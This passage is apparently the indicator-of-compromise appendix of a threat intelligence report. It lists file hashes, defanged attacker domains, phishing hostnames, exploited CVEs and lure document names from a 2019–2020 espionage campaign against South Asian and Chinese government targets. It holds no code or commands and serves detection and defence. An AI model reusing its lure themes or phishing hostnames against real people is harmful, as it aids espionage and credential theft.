b5a0917413007819da64d986367474cbb48e347521f416c0fbcc2889f18daef8 DLL CN October 2019
hostname xaddr[.]net CN October 2019



Page 29
FileHash-SHA256
64dabcc575056b7844658fc3b3f227d3bbdca97eb53f0732ab1633fc34b3f551
RTF - Poly International
Holdings Co.

CVE-2017-11882 CN October 2019
FileHash-SHA256
8ecd1539031e76cbb7f6cb3f4ef9c583e730f2a1b87fcebec9a137da2cde3d25
RTF - Poly International
Holdings Co. CVE-2017-11882 CN October 2019
FileHash-SHA256
81f0bf821b910a2620669981c786fd348ed7694a830d84a4a6eee4ff3dfa009
RTF - Poly International
Holdings Co. CVE-2017-11882 CN October 2019
FileHash-SHA256
8CDE021F7CC7090710F1680C2A0261D6B7A8395355C6DB9970B36BCD8BBF95B3 DLL CN October 2019
FileHash-SHA256
2019A763362F07F6B83A521AF1DAF6D2BE28C670DA594C620EF903EBAFBC2540 .tmp CN October 2019
FileHash-SHA256
8F98AD9DA0ADC8280A6A03D6A9545958AFC9192AA7D9AF9E993BB9EB34539C78 Script - (HTA) "1.a" CN October 2019
FileHash-SHA256
b1417d7ee62878ef75381e4a3a4f388ac08ac4d4bbd9999b126345691e82b0c2
RTF - Quality manual for
Poly Defense Tech
Co."zhengce.doc". Likely
September CVE-2017-11882 CN Def Tech October 2019
FileHash-SHA256
22DAFB2F83DFCA6B4FF04E48BB271D1ABC69EAB6BD8DFD08CA005E886607CCC7 DLL CN Def Tech October 2019
FileHash-SHA256
6C1F0712996D5F0CD273E116BD5B87D9AFBE7BBD5F8784F360FBF03EF2723C10 .tmp CN Def Tech October 2019
FileHash-SHA256
C5FEEE527BB90926949C572BFE3FCEB862727A9F5CEE1FC580A11558253D624E Script - (HTA) - "1.a" CN Def Tech October 2019
FileHash-SHA256
e7d3fb3c9bb87bca464d99919ee90d23173725ff13bc71a47483e14ff2cb3eff
RTF - "wenzhi_tiaoli.doc"
Civilian personnel lure CVE-2017-11882 CN Gov October 2019
FileHash-SHA256
4f915ab00694b9674febef920371f5a444a1cf650ef807e9bb19f3191804fcc4 DLL CN Gov October 2019
FileHash-SHA256
86585476d013b75ec91d389f3fd4b10758c76928a719153dc108acf251523b5f .tmp CN Gov October 2019
domain ap1-port[.]net PK Gov October 2019
domain asp-bin[.]net PK Gov October 2019
FileHash-SHA256
61669c7e59036ae95a2886cf5a42a89633ff8c53cf75e7cb89e0be9f6d4030f4 LNK - "Key_Points.doc.lnk" LNK to Remote Download PK Gov October 2019
FileHash-SHA256
c2cbd91fde5d05590ad5075dea408fbfbaebd88dd1cdc4a4da4f36b77e8ae2e4 Script - (HTA) PK Gov October 2019
FileHash-SHA256
885f93da6af60e70780117d01663fbf6c3650b40fe16110e98eb33b46ee53244 Script - (HTA) PK Gov October 2019
FileHash-SHA256
270B38A754400B015896CE34BB195DEAF9ABA674A8AFBAD30FF934CF7B427465 DLL PK Gov October 2019
FileHash-SHA256
fbd8b1bb2b077320f9cee8e6bff632df0d4472e66861dd3edc311f545aa2fcc9 Script - (HTA) PK Gov October 2019
domain ms-ethics[.]net Android Campaign Unknown October 2019
domain deb-cn[.]net Android Campaign Unknown October 2019
FileHash-SHA256
ff4da194d9d43c5d97d6df0b093e9ce7288b321a85ba76d7dc140ada9e719241 Camero App - Android APK Unknown October 2019
FileHash-SHA256
ec4d6bf06dd3f94f4555d75c6daaf540dee15b18d62cc004e774e996c703cb34 DEX - Android Unknown October 2019
FileHash-SHA256
a60fc4e5328dc75dad238d46a2867ef7207b8c6fb73e8bd001b323b16f02ba00 DEX - Android
Unknown
October 2019



Page 30
FileHash-SHA256
0daefb3d05e4455b590da122255121079e83d48763509b0688e0079ab5d48886 ELF - Android CVE-2019-2215
Unknown
October 2019
FileHash-SHA256
441d98dff3919ed24af7699be658d06ae8dfd6a12e4129a385754e6218bc24fa ELF - Android CVE-2019-2215
Unknown
October 2019
FileHash-SHA256
ac82f7e4831907972465477eebafc5a488c6bb4d460575cd3889226c390ef8d5 ELF - Android CVE-2019-2215
Unknown
October 2019
FileHash-SHA256
135cb239966835fefbb346165b140f584848c00c4b6a724ce122de7d999a3251 ELF - Android CVE-2019-2215
Unknown
October 2019
FileHash-SHA256
ee679afb897213a3fd09be43806a7e5263563e86ad255fd500562918205226b8 ELF - Android CVE-2019-2215
Unknown
October 2019
FileHash-SHA256
a265c32ed1ad47370d56cbd287066896d6a0c46c80a0d9573d2bb915d198ae42 callCamm App - Android APK
Unknown
October 2019
domain sop-cn[.]net PK Gov November 2019
domain sd1-bin[.]net PK Gov November 2019
domain reawk[.]net PK Gov November 2019
FileHash-SHA256
f1cdd47f7a2502902d15adf3ac79c0f86348ba09f4a482ab9108ad98258edb55
.Docx - "ADVOCATE.docx" -
Terrorist Orgs
remote template
injection PK Gov November 2019
FileHash-SHA256
f08ccc040c8d8db60f30a6d1026aa6523e97c6cf52b1b30f083a830a0a65a3a9 RTF - main.file CVE-2017-11882 PK Gov November 2019
FileHash-SHA256
054a029b378b8bbf5ea3f814a737e9c3b43e124995d05d7dac45a87502bf2f62 Script - (HTA) - "1.a" PK Gov November 2019
FileHash-SHA256
920197f502875461186a9d9fbf5a108f7c13677bbdeae129fbc3f535ace27a6f DLL PK Gov November 2019
FileHash-SHA256
d8aa512b03a5fc451f9b7bc181d842936798d5facf1b20a2d91d8fdd82aa28b7 DLL PK Gov November 2019
domain ms-db[.]net
Unable to link to campaign.

Med. Conf. Unknown
November 2019
domain ap1-acl[.]net
BGZ China subdomain, Links
to Dropping Elephant
Unknown
November 2019
domain t10s1[.]net PK Gov December 2019
FileHash-SHA256
54efd37bcd2a78db67319dcbf12cda2647f586d72fd6892472c454e1e3c4ab7f CVE-2017-11882 PK Gov December 2019
FileHash-SHA256
87882b884afd4bd6d4da1fb5e3f87d728f128f75fae32a2720fe899ac7f23f5d RTF - duplicate of above CVE-2017-11882 PK Gov December 2019
FileHash-SHA256
d5c384ad75e7fea08b79bffef8046bd5711bef02b95b2839b68a7232907792e0 RTF - duplicate of above CVE-2017-11882 PK Gov December 2019
FileHash-SHA256
c733dba9451c632c19aaad8d1de61e905dac88453b0839e8900777e121de1755 Script - (HTA) - "1.a" PK Gov December 2019
FileHash-SHA256
0AF77780564DF43F44C13E1E2781648061E63537CACB3FD87FDD0AABFC64D228 DLL PK Gov December 2019
FileHash-SHA256
fcfa191e9058178e13042c5c485d87f8ce04f10435c5fb1689e3d2d9f4bf9b50 DLL PK Gov December 2019
FileHash-SHA256
6c55747d24dcde061d889378282cd35703279af1e696fe9c71e7fb02c167a8f0 DLL PK Gov December 2019
FileHash-SHA256
37cfbcc38e3de533c94f78632881a25e5b7663dad67c1b6714534a7b509ed7ad DLL PK Gov December 2019



Page 31
FileHash-SHA256
BC4A982F8E964EA2F7AE6B25C23F5A5B600179B02D6AEB38883009D926F9DB05 .tmp PK Gov December 2019
hostname mail-mofagovnp[.]zapto[.]org Phishing Pages NP Gov December 2019
Domain gov-af[.]org
Phishing Pages, Used
throughout 2020 AF Gov January 2020
hostname mail-nscaf[.]myftp[.]org
Phishing Pages, Used
throughout 2020 AF Gov January 2020
hostname mail-nepalarmymilnp[.]duckdns[.]org
Phishing Pages, Used
throughout 2020 NP Gov January 2020
FileHash-SHA256
5977e8169436ff69f57bba8e1094dab77545ecd10039d6b73b9270ca4850e37f RTF CVE-2017-11882 PK Gov January 2020
domain cloud-apt[.]net PK Gov February 2020
FileHash-SHA256
ba432fb78990a66b0536f6b3ba77e07116b134172dfcd82cd6d0be7118ca6940 HTA - PK Gov February 2020
FileHash-SHA256
ED8E29D049FC9CFDA83F03030CF53D0138DB8AF5535520F432948EA0078C7EF0 DLL PK Gov February 2020
FileHash-SHA256
51b847eca682cdcfcf5035959fde51d6fc873b2fec30e19f710f488bf6e91f65
Script - (HTA) - public in
April PK Gov February 2020
FileHash-SHA256
CE83CB1C179BAAF31D96EA8ADC6753470C121853651192EC78569048E3AE02DD DLL - public in April PK Gov February 2020
domain ap8-micro[.]net PK Gov February 2020
domain r410b[.]net PK Gov February 2020
domain akamai-api[.]net PK Gov February 2020
domain gov-np[.]org Phishing Page NP Gov February 2020
domain ap-ms[.]net Unknown March 2020
FileHash-SHA256
0dd9d9638a59b6fbab792b7781962571b653c44ebae3d9b8351937ec71f0af8b RTF - CVE-2017-11882
Unknown
March 2020
FileHash-SHA256
20CE0C334633392AC54D7A5A1E8D358A1D3BBCDC20972173A4B8EFE537A74E33 Script - (HTA) - "1.a"
Unknown
March 2020
FileHash-SHA256
65A3F6D8E7DDA60823A6DB928BF50F20E322A7527447E92A3CE0FBAF84D24291 DLL -
Unknown
March 2020
FileHash-SHA256
CC2C5CC4AD46C5CE3C733B0DF9235B1ADAB034E921E46C183501E735F5E6B6AE DLL -
Unknown
March 2020
FileHash-SHA256
5BC8A674FF835A6FDC43EDB90F68C6687F88E84009ADEB508794A7552DC5AE28 .tmp
Unknown
March 2020
FileHash-SHA256
DF7704491BC98BF8AA6A865C2AAE2397CE3EC97CB5373DE8C8487D13DA32A97B .tmp
Unknown
March 2020
FileHash-SHA256
57c3c238dcf6662b0b6383007017e7708540c46adac835c8fbc9edbd417d9911 RTF - Duplicate of above CVE-2017-11882
Unknown
March 2020
domain nrots[.]net PK Gov March 2020
FileHash-SHA256
940921853FF39AB91B47F22E3FA629F3A830D674D9DD4CD2892B5E780B4428B4 ZIP - "AD Test.zip" PK Gov March 2020
FileHash-SHA256
32FE6F67CDCA70420F91642D58E689C3D431117F385EFE321992F1CDB812EB81
PDF -
"Additional_CSD_Rebate.pdf" PK Gov March 2020



Page 32
FileHash-SHA256
f8b053e32eed9a5e814c89eec50e743a906f1aadc7a6f58e25f0410863c5ec4a
LNK -
"Additional_CSD_Rebate.pdf.

lnk" LNK to Remote Download PK Gov March 2020
FileHash-SHA256
4725F5C38D0872013C3BA18911B6609BDFD33C3BD3AF0ACED120FD51DC098F2F DLL PK Gov March 2020
domain cdn-top[.]net PK Gov March 2019
FileHash-SHA256
5e32cb3183264c30aad73a7af4524d178c289f9095c20dfbf98b998adbb50deb LNK - "tax.doc.lnk" LNK to Remote Download PK Gov March 2019
FileHash-SHA256
90d577264060a9d4ee5ba38bd071271cac6bb5840d4b8b9f4c22dc67026c797f DLL PK Gov March 2019
FileHash-SHA256
3e183ee3acca18ba6b59fee72941b25e589478983d66670c349540ab9d9259f3 Script - (HTA) PK Gov March 2019
hostname mail-nepalgovnp[.]duckdns[.]org Phishing Page NP Gov March 2020
hostname mail-nepalpolicegov[.]hopto[.]org Phishing Page NP Gov March 2020
hostname mail-nrborg[.]hopto[.]org Phishing Page NP Financial April 2020
domain cdn-aws[.]net PK Gov April 2019
FileHash-SHA256
6fda3ad56d1e341c8e7883d3e9f21181a141e7bf3d8b7323d84954b0191a94d4
LNK - "jobinstructions.pdf.lnk" LNK to Remote Download PK Gov April 2019
domain d01fa[.]net PK Gov April 2020
FileHash-SHA256
9b0b837e2c4c06c0754824282b9f39dab7ab5681ff118ca6a6f6e548df13dfd2
LNK -
"Pak_Army_Deployed_in_Count
ry_in_Fight_Against_Coronav
irus.pdf.lnk" LNK to Remote Download PK Gov April 2020
FileHash-SHA256
9266f9cf97bafda3a1695335b2ae703a251a548fa4dbf21a2d9d8b1412606c88
LNK -
"Pak_Army_Deployed_in_Count
ry_in_Fight_Against_Coronav
irus.pdf.lnk" LNK to Remote Download PK Gov April 2020
FileHash-SHA256
d302e75752341090fcc9a04bdf8ae8300cc4746b2c4abf7539daafaae275c1f0 Script - (HTA) PK Gov April 2020
FileHash-SHA256
eafcf556108c01ca395baecb1f016e1ead9f7bc5dc7e176326cf4f89b7400441 Script - (HTA) PK Gov April 2020
FileHash-SHA256
3d5f133790f807270f6a64743cb593673f820bca4aba406ee08fda1429a340bd Script - (HTA) PK Gov April 2020
FileHash-SHA256
a422e6df03c5d22bb2e48922f9e9400fc144f9dced2004f508255f02145c5c1c Script - (HTA) PK Gov April 2020
FileHash-SHA256
32E14747E18BD76B7203AE80751648F4DB60002001E7DB08934C2E0DAE631099 Script - (HTA) PK Gov April 2020
FileHash-SHA256
6D47DFCB56CA03B661C75B3D56FF6AFF58991243C4237051B27750283445702F Script - (HTA) PK Gov April 2020
FileHash-SHA256
62045020CE232BC849EB29749E336E33617973E363A7F5F09BA9D6C6160EF83C Script - (HTA) PK Gov April 2020
FileHash-SHA256
A0236E9D27AE575C6103287BF67C21E51CDB2600F16EA5A11564757789CF1D84 Script - (HTA) PK Gov April 2020
FileHash-SHA256
7664CF0F82DF374C168D919505C92736319D0E32685BF36EFBD957D082B6F65D Script - (HTA) PK Gov April 2020
domain fdn-en[.]net PK Gov April 2020
FileHash-SHA256
f961cfaf1173250c87e43392bc73c96cfda20483a180d52e4c3a5742daa26922
LNK - "darazcoupon.pdf.lnk" LNK to Remote Download PK Gov April 2020



Page 33
FileHash-SHA256
e34158b6fd7c46d71c8a58993ba84cd884c4c6f68cab1c844bbad7fb2e0e2378 RTF CVE-2017-11882
Unknown
April 2020
FileHash-SHA256
95EA32A6D9FEC22A8A4F860DB4A7B4C82977C1587D4BE4CF6591C90DAFCA6ECA Script - (HTA) "1.a"
Unknown
April 2020
FileHash-SHA256
F44FD723398E148F7D437D22A417FD5B4C4F835A7B5A7C1624706E942320AFA4 DLL
Unknown
April 2020
FileHash-SHA256
8E26E4DF11C210E5A732A7FED503D07474E6558F655D8548769E1DE1C577AC6C .tmp
Unknown
April 2020
domain link-cdnl[.]net Unknown April 2020
FileHash-SHA256
e0aae3c1a0d247bd2f582c4edf2e89310c4f1b247947d960621fc956bce7d8ad RTF CVE-2017-11882
Unknown
April 2020
FileHash-SHA256
8057829bd5f8fb2f40741c2fc32c46ad33ac21d144fef8afdb3ec8b743beb2a8 RTF CVE-2017-11882
Unknown
April 2020
domain v1ew0[.]net Unknown April 2020
domain by0ts[.]net Unknown April 2020
domain pqn-rog[.]net Unknown April 2020
domain l1st0[.]net Unknown April 2020
domain ms10t[.]net Unknown April 2020
domain clp10s[.]net Unknown April 2020
domain jt01[.]net Unknown April 2020
domain cont-del[.]net Unknown May 2019
domain kat0x[.]net PK Gov / PK Higher Edu May 2020
domain km01s[.]net PK Gov / PK Higher Edu May 2020
FileHash-SHA256
e713b77892c3c4e3b2ba006edf5f17904096369e2de17ed731cd7b7f72ef739f
ZIP - "Policy Guidelines
for Online Classes.zip" PK Gov / PK Higher Edu May 2020 FileHash-SHA256
f7433b0391cb364581243faed48fbb0ee4ab0e76f069d90792e31a5d6a744ea7
LNK - "Policy Guidelines
for Online Classes.pdf.lnk" LNK to Remote Download PK Gov / PK Higher Edu May 2020
FileHash-SHA256
07e7ededc3107d2168c008eb461fc2825001fe15d6a7b92e1518f4ce44a74915 Script - (HTA) PK Gov / PK Higher Edu May 2020
FileHash-SHA256
E2D86999B3C3C84EE0EB6A6FA88CE51308C07DA0BDA2D10119D9559F97CFBE4A Script - (HTA) PK Gov / PK Higher Edu May 2020
FileHash-SHA256
DF9509CC30E21FCF7E1DDAF3D110DC89D839F240084B2892539B681AAB0E4743 Script - (HTA) PK Gov / PK Higher Edu May 2020
FileHash-SHA256
a4793f14a72dcf53841833b3e1930cefb6f5a2affb8990480b335842ee4b3d02 Script - (HTA) PK Gov / PK Higher Edu May 2020
FileHash-SHA256
da8e174a4301c5da1591ebea023acec485062edccbf2dfbae0956e2dc71d9b8c Script - (HTA) PK Gov / PK Higher Edu May 2020
FileHash-SHA256
92092b51db56cddfb13885642d12c36fa6d18d58caf8feb5f5b33ce3c6b2f961 Script - (HTA) PK Gov / PK Higher Edu May 2020
FileHash-SHA256
7a437ea5aaf336a69b78395bc8896e544280c2f1254a0076438c88639c39ff9b Script - (HTA) PK Gov / PK Higher Edu May 2020
FileHash-SHA256
0cfa75e51af786066cf757f5e1cee5d190474be9b599787ce8bba7ef619a4fb8 Script - (HTA) PK Gov / PK Higher Edu May 2020



Page 34
FileHash-SHA256
0015F46CB701A771F613A7EF276DC6DA642970206D8900BED01AC929EC6FE9E1 DLL PK Gov / PK Higher Edu May 2020
FileHash-SHA256
AB538AC5C823763E629F66049B7D1C8013D84A069929D18E078EB3920172419D DLL PK Gov / PK Higher Edu May 2020
FileHash-SHA256
D7A10883419689A18340351884B6E5BCF527D0D278EF28115F41AAE37DF56F0E DLL PK Gov / PK Higher Edu May 2020
FileHash-SHA256
2EC144303C0AE0A044787204C23DD9C8046F4E2CE692AC710942ED0D90A68CAD DLL PK Gov / PK Higher Edu May 2020
FileHash-SHA256
252B2AC19CC1F9A371E131121C505ABBC21B5CF43A1EF21A9B8F853DC0DDC390 DLL PK Gov / PK Higher Edu May 2020
FileHash-SHA256
BB1B69EFBBD711E422C5A8167888C72A0F76C7DAF63414E7734B6AA648D0A44F DLL PK Gov / PK Higher Edu May 2020
FileHash-SHA256
78E9C2BF6CDBF8C5456B7684A6184EEFB449DEF18EAA40DFB4E8CD4B2DA75905 .tmp PK Gov / PK Higher Edu May 2020
FileHash-SHA256
DC877602FE1DEF575C439D175C686DA9BC0AFBAE53E01C23AD1C4D19E8911E72 .tmp PK Gov / PK Higher Edu May 2020
FileHash-SHA256
65C42FEF3DF4A2B4974E9A1C907FA79B6C2CD96406C309B0963F358FC4A7C23A
PDF - "Policy Guidelines
for Online Classes.pdf" PK Gov / PK Higher Edu May 2020
domain z3st[.]net Unknwon May 2020
domain ts10l[.]net Unknwon May 2020
FileHash-SHA256
78ee88609c686fc3b5183b606cd0253320f9904ffce188ae7426cd55c132b0fc Script - (HTA) Unknwon May 2020
FileHash-SHA256
8881e03131ba5c85449a6b904b201201c899dc8477b45aa0fcc040ae59094534 Script - (HTA) Unknwon May 2020
FileHash-SHA256
7d23be3b9f63806cf3537866089a7d940956ad33398dd268ec16f1b4b41da3ba Script - (HTA) Unknwon May 2020
FileHash-SHA256
d6c9d0c19ed59c5030966a08042f7a9843c0698842e031c0bc1cb1feb24df0f4 Script - (HTA) Unknwon May 2020
FileHash-SHA256
ab54ff950ba0633e3b6fbc9dae8e7e886ab6bc2044d0b39af8dc2f216e12e391 Script - (HTA) Unknwon May 2020
FileHash-SHA256
dbe41238250010db2c32364d2e43e106f392a19f1df7c33c41279bb12946442e Script - (HTA) Unknwon May 2020
FileHash-SHA256
535ddd938e593d6e0a7c20b1de47b2e9290330f8cd8234f7f388ec11f4f9e069 Script - (HTA) Unknwon May 2020
FileHash-SHA256
72f98a8e5376e334831b7d50aca2d9bb88b3f1e8fb7149b53139b89813fafdde Script - (HTA) Unknwon May 2020
FileHash-SHA256
23c345c13f1efed1f1bdc2632e556af088d5c2226ad054a58b13b84d12c0e41c Script - (HTA) Unknwon May 2020
domain r0dps[.]net Unknwon June 2020
domain k1g0[.]net Unknwon June 2020
domain chrom3[.]net Various - Asia June 2020
FileHash-SHA256
98af6635138045cae3f29995a587d0c8a7f14446a9d10564677dd4a41372c3f1
RTF - Bangladesh Indenting
Agents' Association CVE-2017-11882 BD Gov June 2020
FileHash-SHA256
0D5A3DF529ADD0FF4B0ECAAB060BB1A2614B5B7478AB0CC99AF3596696789592 DLL BD Gov June 2020



Page 35
FileHash-SHA256
FE2CAAD6F83635F293149855D3D7EB5507C966A36DDC7A30D18172D96121F107 Script - (HTA) - "1.a" BD Gov June 2020
FileHash-SHA256
e40a12e6e64fdd06abe843b2e70bfc59c279923cec7bc47f8c8964b4d7a53b7b
RTF - Nominal Roll for BMAC
Journal 2020.doc" CVE-2017-11882 Various - Asia June 2020
FileHash-SHA256
2ed2fef9bdae1f9de8303453b978f20cbdb1bcbe3d29191b4b965daff5181799
LNK - "AFC New
Board.pdf.lnk" LNK to Remote Download AF Gov June 2020
FileHash-SHA256
c39dd5986703192b78f9a85f674976498b3054498002c026d6965226719185dd ZIP - "AFC New Board.zip" AF Gov June 2020
FileHash-SHA256
623123BC86A5A7A32D7078DED44944C94E1BAF957C87C7B881BD4B3FB2A8528A DLL AF Gov June 2020
FileHash-SHA256
BEB0E16F94A0C57B9286B46C52275B67F537212EC8A99EF2B8E75CF12A20EA3D DLL AF Gov June 2020
FileHash-SHA256
04e0d94b1a24d12d690c41a5142b8652cfb517454b0c52eee912179dceb52a9a Docx CVE-2017-0199 CN Research University June 2020
FileHash-SHA256
373849c2c371bdf76b776fee44c7b7463205f9e17ba6d1d61040121092720689 RTF CVE-2017-0199 CN Research University June 2020
FileHash-SHA256
ea69aac447b83805c2e3b78e5d0512aacbc12d7edfdf5b6bdf99019473d474f3 RTF CVE-2017-0199 CN Research University June 2020
FileHash-SHA256
bbd231b7b6a3ced7c515fc11335cd7a353c0c9cd7f2f840450c6d7f861992a5e Script - (HTA) CVE-2020-0674 CN Research University June 2020
FileHash-SHA256
DF8493F35549A5E0B533873B0F63D9CED4141860B06D4C20EB5C846C53A8B01C DLL CN Research University June 2020
FileHash-SHA256
EA0CB411AB1A5F6ADDD5565515A6425600F879363B6ECAE939207560CFE353AE .tmp CN Research University June 2020
FileHash-SHA256
36b653ede8d68fbb9a9343507aa437125e5915655fe12763dbb109c97bed617b Script - (HTA) PK Gov June 2020
FileHash-SHA256
e5e4cfdce04a98c723fb25f1e66794c61af617e9e68b866ca4961eeb7520000b Script - (HTA) PK Gov June 2020
hostname tsinhhua[.]gov-mil[.]cn PK Gov June 2020
hostname www-oimc[.]gov-mil[.]cn PK Gov June 2020
domain cdn-gov[.]net PK Gov June 2020
hostname www-geneva-pk[.]gov-mil[.]cn PK Gov June 2020
hostname tsinghua[.]gov-mil[.]cn PK Gov June 2020
hostname www-pak-emb[.]gov-mil[.]cn PK Gov June 2020
domain fqn-asw[.]net Medium Confidence PK Gov June 2020
domain cdn-m1l[.]net PK Gov June 2020
domain fqn-cloud[.]net PK Gov June 2020
domain tar-gz[.]net
Possible subdomains used in
campaigns againt Bank and
multiple gov orgs PK Gov July 2020
FileHash-SHA256
813fa309502d719dced7b54162db4222025147e071bff6416886587634e36510
LNK - "Hajj Policy and Plan
2020.pdf.lnk" LNK to Remote Download PK Gov July 2020
FileHash-SHA256
53a4299b79bde7504d2b354c1d6c28660338ea7778723a9d6ed1260c20b8dd5d
LNK - "Hajj Policy and Plan
2020.pdf.lnk" LNK to Remote Download PK Gov July 2020



Page 36
FileHash-SHA256
508c93c385ec5e2dcae48857acc36ba47443f8d40b2bc34bcc12f857c7a200d3 Docx PK Gov July 2020
FileHash-SHA256
9fe8a99dff1b7264d17a022a08b675f9d0ea8c1377f75c30a9bc275dcfcc4b43 Script - (HTA) PK Gov July 2020
FileHash-SHA256
113b4475ba47ca9ae724a41d1e03d8243aeba6ee4bd2975efca3cfea7ab9d12d Script - (HTA) PK Gov July 2020
FileHash-SHA256
848ac4957702cde3ba91394e4f8deb221d67459f4502cc33c6d96a799ff7bad7 Script - (HTA) - "1.a" PK Gov July 2020
FileHash-SHA256
E9A1A5395E6A542535A7A518E6D93B8AB854FEBF03EF3F03E582E3979A09495D DLL PK Gov July 2020
FileHash-SHA256
F80EEC1D986F34420AB0FB9C29AAE02A8442E79CB3B0C730EDE7271337F55A15 DLL PK Gov July 2020
hostname eedow[.]gov-mil[.]cn CN Gov / CN Others July 2020
hostname polyinc[.]gov-mil[.]cn CN Gov / CN Others July 2020
hostname polync[.]gov-mil[.]cn CN Gov / CN Others July 2020
hostname poliync[.]gov-mil[.]cn CN Gov / CN Others July 2020
hostname mofa[.]gov-mil[.]cn CN Gov / CN Others July 2020
hostname www-mofa[.]gov-mil[.]cn CN Gov / CN Others July 2020
hostname pk[.]gov-mil[.]cn CN Gov / CN Others July 2020
FileHash-SHA256
28f08c790dcaef7216b52cebef37e436319c3e1a25ed2762bdd14b8b41befd80 Script - (HTA) CN Gov / CN Others July 2020
FileHash-SHA256
58ece87d7521234153f84db973b2587ec6e999a8c2a56e8c3ef88261415b03e8 Script - (HTA) CN Gov / CN Others July 2020
FileHash-SHA256
7987da89a461555c31a4c00990a6f776d14356eee6e52c5bf26bbb1a1cd638ed Script - (HTA) CN Gov / CN Others July 2020
FileHash-SHA256
56fa1ee04e45849ed69bd25f588cd3671c30006269487806b380ca9cc451ad1a Script - (HTA) CN Gov / CN Others July 2020
FileHash-SHA256
074e7ae3b52929b2533cb20d9da28a773dde527e17f64d646e47323a2acd254f Script - (HTA) CN Gov / CN Others July 2020
FileHash-SHA256
0B3C3D94B5D3C3AFF770A089503034F7357110A2168E6995214F5E0B708CA3DB DLL CN Gov / CN Others July 2020
FileHash-SHA256
82C30E6D14B42B8492AC9EB4A13951A3D4C8F63929232DC81D821C0E513C286F DLL CN Gov / CN Others July 2020
FileHash-SHA256
877D217390AD71763D3E6F062A097F2A8E64E066C6D63AA680BB9F6738491967 DLL CN Gov / CN Others July 2020
FileHash-SHA256
C0E6785C2319CD79D9C2276E38E51D65E539F548C72F41716F30F677098283B6 .tmp CN Gov / CN Others July 2020
hostname stinghua[.]gov-mil[.]cn CN Gov / CN Others July 2020
hostname ee-dow[.]gov-mil[.]cn CN Gov / CN Others July 2020
FileHash-SHA256
012db1429d38232415b021ef951091d0894703724c26f50fd38785e6c5813ad8
RTF - "BGI 43.doc" - Belt
and road + covid CVE-2017-11882 PK Gov July 2020
FileHash-SHA256
113C1C5E176CEBE42E452E7EC6DED434C8F620372CEF7AE7BFDC6B9469C1B3A4 DLL PK Gov July 2020



Page 37
FileHash-SHA256
14CCF64395FF367670A34FA42F7703424ED5998E02056B2E7562BEDBB3DB4535 .tmp PK Gov July 2020
FileHash-SHA256
BE2820B9DBA31949D688565CB178A8620BAB6255C3227C1702B865F57715BF71 Script - (HTA) - "1.a" PK Gov July 2020
FileHash-SHA256
e2ec505f88125cdb08c329187be5ed35caf81ea3a14267e8ef2ce29c75d2634c Script - (HTA) PK Gov July 2020
FileHash-SHA256
97d579713192e7ea04f8a698e2b77ed47d39b4a498fa9f43eda002498ce2f5b7 Script - (HTA) PK Gov July 2020
Domain mil-pk[.]net
Medium Confidence,
unconfirmed PK Gov July 2020
FileHash-SHA256
6920bfaefa3d4b73390e895d21c796ee161464f84defb15f4372c0cecc49d0e9 Final payload Unknown August 2020
Domain gov-mil[.]net
Medium Confidence,
unconfirmed link PK Gov August 2020
FileHash-SHA256
1fd742baa9b2ab29e30780d9a92bc3e2db03d1a17f48f956d74dfe6fb98a7aca
RTF - "Brief.doc" PK/IN
Relations CVE-2017-11882 PK Gov August 2020
FileHash-SHA256
63aba37a9291a75256b9f89cb5a999ee6ada020be4917caaed39382f7a637b18
RTF -
"FATFRTMG202010REV1.en.doc" CVE-2017-11882 PK Gov August 2020
FileHash-SHA256
a89189f1c7c101c8d9c2637e571c4f8546df3ea557a576090cde7b75009981a9
RTF -
"info_regarding_Police_Offi
cial_Infectedwithcovid.doc" CVE-2017-11882 PK Gov August 2020
Domain filesrvr[.]net AF Gov August 2020
Domain asw-edu[.]net AF Gov August 2020
FileHash-SHA256
8b30570303dc26bc02fb95a42b4ce91ccf82a02998c67f73340c50630a0aa5dd
ZIP - "IT Services Request
Form (1).zip" AF Gov August 2020
FileHash-SHA256
4aab7127a51af60267d2343dfa58cb50f3fb47ed565e0cfd188f99d4821b7af2
LNK - "IT Services Request
Form.doc.lnk" LNK to Remote Download AF Gov August 2020
FileHash-SHA256
46eae74e90b325bb29fb92810c453a700d705730a0c8e04738b7d52d68fa00ea Script - (HTA) AF Gov August 2020
FileHash-SHA256
990d79050246cda5427276ab3a5021c8729c0d4b37776d3a3323d1f114226573 Script - (HTA) AF Gov August 2020
FileHash-SHA256
4c7fd224f8bc5442b81f2a19422ec9a18eacf91f131338b02a4b7559e86155cd Script - (HTA) AF Gov August 2020
FileHash-SHA256
bf09f665d11fe682895081a9a30b48fe34c68a770037e5215e350e9508dfc982 DLL AF Gov August 2020
FileHash-SHA256
4a0947dd9148b3d5922651a6221afc510afcb0dfa69d08ee69429c4c75d4c8b4 DLL AF Gov August 2020
FileHash-SHA256
f7eb8fdb6eabb2fb64314c898c621c4aedb8c167c50bd62ad799fa2c0bc306b6 DLL AF Gov August 2020
FileHash-SHA256
8f954f75ff22ae242d8ffd4f4685e078a359851f714f6b046b5adee4c8681178 DLL AF Gov August 2020
FileHash-SHA256
319bd26ad751a79b1b1c474749d3d856277b712f1eca3b1a88a8605a8f2facaf DLL AF Gov August 2020
FileHash-SHA256
029743403524b570fd2965dc90f57c6ed367e3afc874eed05c2aa6b1551d1091 DLL AF Gov August 2020
FileHash-SHA256
18d3a9bc73fec8d5ffa5dc6a6f1d378797ccd947ea173ff214e18cfe2ed3c6ce DLL AF Gov August 2020



Page 38
FileHash-SHA256
1ace94ebe4841ab01e53accaebc16fc50af7c5017d03f30471d49df9a4737f2f
DLL - Decrypted Final
payload Unknown August 2020
FileHash-SHA256
1a9d8b16ef6132884161bd820fe24cbfc8dc9514c3b31d7eacf4de707899dd6a DLL Unknown August 2020
FileHash-SHA256
37d6563ca03512fcc904264ce83ce1b741f3e599274dcdf45b3d055250793c31
DLL - Decrypted Final
payload Unknown August 2020
Hostname mail-ncporgnp[.]hopto[.]org Phishing Page NP Gov August 2020
Hostname mail-mofgovnp[.]hopto[.]org Phishing Page NP Gov September 2020
Domain cdn-aws-s2[.]net PK Gov September 2020
Domain aws-pk[.]net PK Gov September 2020
FileHash-SHA256
21646c896ccc422f64c7ed8888891d2946c4542260c6c02af9f99a7f5f6dd342 Audit_Observation2019.zip PK Gov September 2020
FileHash-SHA256
0ee926f443c66a0d47365dbb6d21dcea6f6624e730c99f47cfb492ee2832419e
Protocol.doc - "Poland and
Pakistan together for
Security" PK Gov September 2020
FileHash-SHA256
7af1f15ecd841d82b150c36bd0aa3754878057a809c5bf4fcc83eeb7bc13477e
DLL - Decrypted Final
payload PK September 2020
FileHash-SHA256
948c72bc2380eafd7e9cca9932537772c4e354c30fd26448cc87f1ee2a134cad Script PK September 2020
